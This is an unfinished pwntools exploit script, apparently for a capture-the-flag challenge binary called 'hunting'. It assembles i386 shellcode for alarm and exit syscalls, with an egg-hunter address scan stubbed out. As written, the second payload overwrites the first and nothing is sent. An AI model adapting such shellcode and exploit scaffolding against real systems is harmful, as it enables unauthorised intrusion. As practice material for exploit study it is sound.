#!/bin/python3

from pwn import * 

context.clear(arch="i386")
context.terminal = ["terminator", "-e"]


HOST = ""
PORT = 0

sh = process("/home/luis/Documents/tests/hunting/h")
#sh = process("./hunting")
#sh = remote(HOST, PORT)

def com(payload):
    global sh
    log.progress("Sending payload...")
    sh.sendline(payload)
    log.success("SENT!")
    data = sh.recv()
    log.success("Received the response")
    return data

lowest_addr = 0x60000000
highest_addr= 0x80000000
incrementor = 0x10000

# might need to clean registers
# xor eax, eax
# xor ebx, ebx

# alarm(99)
payload =  asm("""
    xor eax, eax
    mov eax, 0x1b 
    mov ebx, 0x63
    int 0x80
    """)

# read(0, esp, 500) - reads from stdin and store in the stack
# payload += asm("""
#     xor eax, eax
#     mov eax, 0x3
#     mov ebx, 0x0
#     mov ecx, [esp+4]
#     mov edx, 0x1f4
#     int 0x80
#     """)

# payload += asm("""
#     jnz
#     """)

payload = asm("""
    xor eax, eax
    mov al, 0x1
    xor ebx, ebx
    int 0x80
    """)

log.progress("Sending initial payload...")
print(payload)
# for addr in range(lowest_addr, highest_addr, incrementor):
#     pass    

